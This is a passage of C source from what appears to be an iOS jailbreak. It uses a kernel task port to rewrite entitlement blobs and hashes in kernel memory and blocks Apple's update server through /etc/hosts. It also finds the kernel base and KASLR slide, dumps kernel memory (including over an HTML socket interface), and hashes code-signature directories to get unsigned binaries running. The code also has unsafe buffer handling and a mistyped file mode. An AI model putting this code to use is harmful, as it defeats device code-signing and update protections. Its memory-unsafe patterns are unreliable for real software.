    printf("[i]\thash at 0x%llx\n",hash_ptr);
    bzero(estring+8, blob_size-8); // leave the header in estring!
    strcpy(estring+8, new_blob); // leave the header in estring!
    ctx = malloc(sizeof(SHA256_CTX));
    sha256_init(ctx);
    sha256_update(ctx, (BYTE *)estring, blob_size);
    char* new_hash = malloc(0x20);
    sha256_final(ctx, (BYTE *)new_hash);
    free(ctx);
    mach_vm_write(tfp0, (mach_vm_address_t)ent_blob_ptr, (vm_offset_t)estring, blob_size);
    mach_vm_write(tfp0, (mach_vm_address_t)hash_ptr, (vm_offset_t)new_hash, 0x20);
    printf("[i]\tNew blob: %s\n", new_blob);
    printf("[i]\tHere's the new entitlentment hash: [");
    for (i=0;i<0x20;i++)
        printf("%02x", new_hash[i] & 0xff);
    printf("]\n");
    free(new_hash);
    free(estring);
    // so, I'm still generating a entitlement errors but....things work so....dunno
}

void neuter_updates()
{
    FILE *fd;
    char *neuter = "127.0.0.1 mesu.apple.com";
    char *data = malloc(0x400);
    int flag = 0;
    fd = fopen("/etc/hosts", "r");
    while (fgets(data, 0x400, fd))
    {
        if (strstr(data, neuter))
            flag = 1;
    }
    fclose(fd);
    if (!flag)
    {
        printf("[+]\tAdding in DNS entry to stop update!\n");
        fd = fopen("/etc/hosts", "a");
        fprintf(fd, "\n%s\n", neuter);
        fclose(fd);
    } else {
        printf("[+]\tLooks like the update DNS record has already been added!\n");
    }
    free(data);
}

// Bryce's code
uint32_t get_pid_from_name(char* name)
{
    uint32_t index = 0;
    char buf[1024];
    int buf_size = 1024;
    uint32_t pid = -1;
    for (index=0; index < 0xffff; index++)
    {
        buf[0] = 0;
        proc_name(index, buf, buf_size);
        if (strlen(buf) > 0)
        {
            //printf("\t\t%d\t%s\n", index, buf);
            if (strcmp(name, buf) == 0)
                pid = index;
        }
    }
    return pid;
}

// Bryce's code
void ps_html(int sfd)
{
    uint32_t index = 0;
    char buf[1024];
    char buf2[1024];
    int buf_size = 1024;
    for (index=0; index < 0xffff; index++)
    {
        buf[0] = 0;
        proc_name(index, buf, buf_size);
        if (strlen(buf) > 0)
        {
            printf("%d -- %s (0x%llx)\n", index, buf, get_proc_block(index));
            sprintf(buf2, "<br>%d -- %s (<a href=/dump_ptr=0x%llx>0x%llx</a>)</ br>\n", index, buf, get_proc_block(index), get_proc_block(index));
            send(sfd, buf2, strlen(buf2), 0);
        }
    }
}

// Bryce's code
void write_file(char *f_name, char *f_data, size_t f_size)
{
    printf("[i]\tAttempting to write %zu bytes to [%s]\n", f_size, f_data);
    int fd = open(f_name, O_CREAT | O_WRONLY, 777);
    if (fd > 0)
    {
        if (f_size == write(fd, f_data, f_size))
        {
            close(fd);
            printf("Successfully wrote the file\n");
        } else {
            printf("[-]\tError during writing process\n");
        }
    } else {
        printf("[-]\tCouldn't create the file\n");
    }
}

// Bryce's code
void do_execution_test(char* app_path)
{
    /*this is the test to see if the jailbreak works*/
    char *s = malloc(1024);
    strcpy(s, app_path);
    strcat(s, "iosbinpack64/bin/sleep");
    char *args[3] = {"sleep", "15", NULL};
    time_t start = time(0);
    execv(s, args);
    free(s);
    if ((time(0) - start) > 1)
    {
        printf("[+]\tWE CAN RUN CODE - JAILBREAK ALMOST COMPLETE!!!!]\n");
    } else {
        printf("[-]\tWe can't run code, work harder\n");
    }
}

// Bryce's code
void dump_pointer(mach_port_t tfp0, addr64_t addr, uint64_t max_size)
{
    //printf("[?]\tAttempting to dump pointer at 0x%llx\n", addr);
    kern_return_t err;
    vm_offset_t data_out = 0;
    mach_msg_type_number_t out_size = 0;
    err = mach_vm_read(tfp0, addr, max_size, &data_out, &out_size);
    if (err != KERN_SUCCESS) {
        //printf("mach_vm_read failed: %x %s\n", err, mach_error_string(err));
        return;
    }
    int i,c;
    for (i=0; i<max_size;i++)
    {
        c = (char)*(uint64_t*)(data_out + i);
        printf("\\x%02x", c & 0xff);
    }
    printf("\n");
    for (i=0x0; i < max_size; i+= 8)
    {
        printf("[0x%llx + 0x%02x]\t0x%016llx\n", addr, i, *(uint64_t*)(data_out+i));
    }
}

// Bryce's code
char* dump_pointer_html(mach_port_t tfp0, addr64_t addr, uint64_t max_size)
{
    uint64_t current_alloc = 0x3000;
    char *html = malloc(current_alloc);
    //uint64_t html_length = 0;
    
    strcpy(html, "<html>\n");

    kern_return_t err;
    vm_offset_t data_out = 0;
    mach_msg_type_number_t out_size = 0;
    err = mach_vm_read(tfp0, addr, max_size, &data_out, &out_size);
    if (err != KERN_SUCCESS) {
        sprintf(html, "mach_vm_read failed: %x %s\n", err, mach_error_string(err));
        return html;
    }
    int i;
    unsigned char c;
    for (i=0x0; i < max_size; i+= 8)
    {
        char *tmp = malloc(0x2000);
        //html_length = strlen(html);
        sprintf(tmp, "<br>[<a href=/dump_ptr=0x%llx>0x%llx + 0x%02x</a>]\t<a href=/dump_ptr=0x%llx>0x%016llx</a></ br>\n", addr + i, addr, i, *(uint64_t*)(data_out+i), *(uint64_t*)(data_out+i));

        //uint64_t new_length = strlen(tmp);

        //if (current_alloc < (html_length + new_length))
        //    realloc(html, html_length + new_length);
        strcat(html, tmp);
        free(tmp);
    }
    //html_length = strlen(html);
    //if (current_alloc < (html_length + max_size * 4 + 0xc))
    //    realloc(html, html_length + max_size * 4 + 0xc);
    strcat(html, "<br>");
    for (i=0; i<max_size;i++)
    {
        char tmp[5];
        c = *(char *)(data_out + i);
        sprintf(tmp, "\\x%02x", c);
        tmp[4]=0;
        strcat(html, tmp);
    }
    strcat(html, "</ br></html>\n");
    return html;
}

// Bryce's code
#include <dirent.h>
void ls(char *cwd)
{
    printf("[i]\tListing [%s]\n", cwd);
    DIR *dir = opendir(cwd);
    struct dirent *ent;
    if (dir != NULL) {
        /* print all the files and directories within directory */
        while ((ent = readdir(dir)) != NULL)
        {
            printf("%s\n", ent->d_name);
        }
        closedir(dir);
    } else {
        /* could not open directory */
        printf("Couldn't open directory\n");
        return;
    }
}

// harvested from somewhere on the net (stackexchange?)
void listdir(const char *name, int indent)
{
    DIR *dir;
    struct dirent *entry;

    if (!(dir = opendir(name)))
        return;

    while ((entry = readdir(dir)) != NULL)
    {
        if (entry->d_type == DT_DIR)
        {
            char path[1024];
            if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
                continue;
            snprintf(path, sizeof(path), "%s/%s", name, entry->d_name);
            printf("%*s[%s]\n", indent, "", entry->d_name);
            listdir(path, indent + 2);
        } else
        {
            printf("%*s- %s\n", indent, "", entry->d_name);
        }
    }
    closedir(dir);
}

// Bryce's code
#include <sys/fcntl.h>
void cat(char *f_name)
{
    printf("[i]\tDumping [%s]\n", f_name);
    /*
      cat out files in a nice hex format
         amfid
         launchd`
         dyld
     */
    signed int max_count = 0x1000; // we truncate after this for a quick file size validation
    int truncate = 0; // change this to revert to normal behavior
    int print_hex = 1; // plaintext vs copy/pasteable hex
    int fd = open(f_name, O_RDONLY);
    int c;
    while (1 == read(fd, &c, 1))
    {
        if (print_hex) 
        {
            printf("\\x%02x", c & 0xff);
        } else {
            printf("%c", c & 0xff);
        }
        max_count--;
        if (truncate)
            if (max_count < 0)
                break;
    }
    printf("\nFile dumped\n");
}

// Bryce's code
extern uint64_t find_port_via_kmem_read(mach_port_name_t port);
uint64_t dump_kernel(mach_port_t tfp0, uint64_t kernel_base)
{
    // ok, where the f*ck is the kernel
    // uint64_t kernel_base = 0xfffffff00760a0a0; //15B202 on iPhone 6s
    mach_port_t self = mach_host_self();
    uint64_t port_addr = find_port_via_kmem_read(self);
    uint64_t search_addr = rk64(port_addr + 0x68); //KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT
    search_addr &= 0xFFFFFFFFFFFFF000;
    printf("[+]\tGoing backwards until magic seen....\n");
    while (1)
    {
        if (rk32(search_addr) == 0xfeedfacf)
        {
            printf("[+]\tOk, looks like we've found the beginning of the kernel!\n");
            printf("[+]\tKERNEL IS AT 0x%llx\n", search_addr);
            printf("[+]\tKASLR detected to be 0x%llx\n", search_addr + 0x6060a0 - kernel_base); //only 12 bits of entropy lawl
            return search_addr;
        } else {
            search_addr-=0x1000;
        }
    }
}

//harvested from https://codereview.stackexchange.com/questions/64797/byte-swapping-functions
uint16_t bswap16(uint16_t a)
{
    a = ((a & 0x00FF) << 8) | ((a & 0xFF00) >> 8);
    return a;
}

//harvested from https://codereview.stackexchange.com/questions/64797/byte-swapping-functions
uint32_t bswap32(uint32_t a)
{
    a = ((a & 0x000000FF) << 24) |
    ((a & 0x0000FF00) <<  8) |
    ((a & 0x00FF0000) >>  8) |
    ((a & 0xFF000000) >> 24);
    return a;
}

//harvested from https://codereview.stackexchange.com/questions/64797/byte-swapping-functions
uint64_t bswap64(uint64_t a)
{
    a = ((a & 0x00000000000000FFULL) << 56) |
    ((a & 0x000000000000FF00ULL) << 40) |
    ((a & 0x0000000000FF0000ULL) << 24) |
    ((a & 0x00000000FF000000ULL) <<  8) |
    ((a & 0x000000FF00000000ULL) >>  8) |
    ((a & 0x0000FF0000000000ULL) >> 24) |
    ((a & 0x00FF000000000000ULL) >> 40) |
    ((a & 0xFF00000000000000ULL) >> 56);
    return a;
}

typedef struct __BlobIndex {
    uint32_t type;                                  /* type of entry */
    uint32_t offset;                                /* offset of entry */
} CS_BlobIndex;

typedef struct __SuperBlob {
    uint32_t magic;                                 /* magic number */
    uint32_t length;                                /* total length of SuperBlob */
    uint32_t count;                                 /* number of index entries following */
    CS_BlobIndex index[];                   /* (count) entries */
    /* followed by Blobs in no particular order as indicated by offsets in index */
} CS_SuperBlob;


/*
 * C form of a CodeDirectory.
 */
typedef struct __CodeDirectory {
    uint32_t magic;                                 /* magic number (CSMAGIC_CODEDIRECTORY) */
    uint32_t length;                                /* total length of CodeDirectory blob */
    uint32_t version;                               /* compatibility version */
    uint32_t flags;                                 /* setup and mode flags */
    uint32_t hashOffset;                    /* offset of hash slot element at index zero */
    uint32_t identOffset;                   /* offset of identifier string */
    uint32_t nSpecialSlots;                 /* number of special hash slots */
    uint32_t nCodeSlots;                    /* number of ordinary (code) hash slots */
    uint32_t codeLimit;                             /* limit to main image signature range */
    uint8_t hashSize;                               /* size of each hash in bytes */
    uint8_t hashType;                               /* type of hash (cdHashType* constants) */
    uint8_t spare1;                                 /* unused (must be zero) */
    uint8_t pageSize;                               /* log2(page size in bytes); 0 => infinite */
    uint32_t spare2;                                /* unused (must be zero) */
    /* followed by dynamic content as located by offset fields above */
} CS_CodeDirectory;

// RE'd from QiLin
#define LC_CODE_SIGNATURE 0x1d  /* local of code signature */
char* get_binary_hash(char* filename)
{
    int fd = open(filename, 0);
    if (fd == -1)
    {
        printf("[-]\tFile [%s] not found!\n", filename);
        return 0;
    } else {
        struct stat stat;
        if (fstat(fd, &stat))
            printf("t[-]\tThere was an error getting the stat of the file!");
        void* header = malloc(stat.st_size);
        read(fd, header, stat.st_size);
        
        struct mach_header_64* hdr = (struct mach_header_64*)header;
        uint8_t* commands = (uint8_t*)(hdr+1);
        uint32_t ncmds = hdr->ncmds;
        printf("[+]\tGot Header with %d Load commands\n", hdr->ncmds);
        uint32_t i;
        for (i=0; i < ncmds; i++)
        {
            struct load_command* lc = (struct load_command*)commands;
            if (lc->cmd == LC_CODE_SIGNATURE)
            {
                struct linkedit_data_command* cs_cmd = (struct linkedit_data_command*)lc;
                printf("[+]\tfound LC_CODE_SIGNATURE blob at offset +0x%x\n", cs_cmd->dataoff);
                uint32_t* code_base = (uint32_t*)((uint64_t)header + (uint64_t)cs_cmd->dataoff);
                uint32_t magic = *code_base;
                uint32_t offset = bswap32(code_base[4]); //TODO this is janky, tie symbols to [4]
                uint32_t type = bswap32(code_base[3]); //TODO this is janky, tie symbols to [3]
                magic = bswap32(magic);
                printf("[+]\tGot BLOB, MAGIC: 0x%x, offset: %x, type: %x\n",
                       magic,
                       offset,
                       type);
                if (!strncmp((char *)code_base, "Apple Ce", 8)) //TODO properly handle signed code
                {
                    printf("[X]\tThis is already signed properly so let's let it do it's own thing\n");
                    return 0;
                } else {
                    CS_SuperBlob* sb = (CS_SuperBlob*)code_base;
                    
                    for (uint32_t i = 0; i < ntohl(sb->count); i++)
                    {
                        CS_BlobIndex* bi = &sb->index[i];
                        uint8_t* blob = ((uint8_t*)sb) + (htonl(bi->offset));
                        printf("[i]\t\tblob &    : 0x%16llx\n", (uint64_t)blob);
                        printf("[i]\t\t*blob+0x00: 0x%16llx\n", *(uint64_t *)(blob+0x0));
                        printf("[i]\t\t*blob+0x08: 0x%16llx\n", *(uint64_t *)(blob+0x8));
                        printf("[i]\t\t*blob+0x10: 0x%16llx\n", *(uint64_t *)(blob+0x10));
                        printf("[i]\t\t*blob+0x18: 0x%16llx\n", *(uint64_t *)(blob+0x18));
                        if (htonl(*(uint32_t*)blob) == 0xfade0c02) {
                            CS_CodeDirectory* cd = (CS_CodeDirectory*)blob;
                            printf("[+]\tfound code directory, length=0x%x\n", htonl(sb->length));
                            SHA256_CTX *ctx = malloc(sizeof(SHA256_CTX));
                            sha256_init(ctx);
                            sha256_update(ctx, blob, htonl(cd->length));
                            char* ret = malloc(0x20);
                            sha256_final(ctx, (BYTE *)ret);
                            return ret;
                        }
                    }
                }
                return ((char*)header) + cs_cmd->dataoff;
            }
            commands += lc->cmdsize;
        }
        
    }
    close(fd);
    return 0;
}

// not sure where this came from but saving it
vm_size_t read_kernel(mach_port_t tfp0, vm_address_t addr, vm_size_t size, unsigned char* buf)
{
    kern_return_t ret;
    vm_size_t remainder = size;
    vm_size_t bytes_read = 0;
    vm_address_t end = addr + size;
    // reading memory in big chunks seems to cause problems, so
    // we are splitting it up into multiple smaller chunks here
    #define MAX_CHUNK_SIZE 0x500
    while (addr < end) {
        size = remainder > MAX_CHUNK_SIZE ? MAX_CHUNK_SIZE : remainder;
        ret = vm_read_overwrite(tfp0, addr, size, (vm_address_t)(buf + bytes_read), &size);
        if (ret != KERN_SUCCESS || size == 0)
            break;
        bytes_read += size;
        addr += size;
        remainder -= size;
    }
    return bytes_read;
}

